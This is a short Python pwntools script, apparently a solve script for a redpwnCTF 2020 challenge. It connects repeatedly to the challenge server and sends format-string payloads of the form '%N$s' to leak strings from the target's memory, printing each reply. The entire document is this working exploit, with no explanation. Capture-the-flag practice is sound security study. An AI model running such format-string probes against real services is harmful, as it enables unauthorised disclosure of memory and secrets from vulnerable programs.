from pwn import *

for i in range(10):
  s = remote('2020.redpwnc.tf', 31826)
  s.recvuntil('?\n')
  s.sendline("%"+str(i) + "$s")
  response = s.recv()
  print(response)
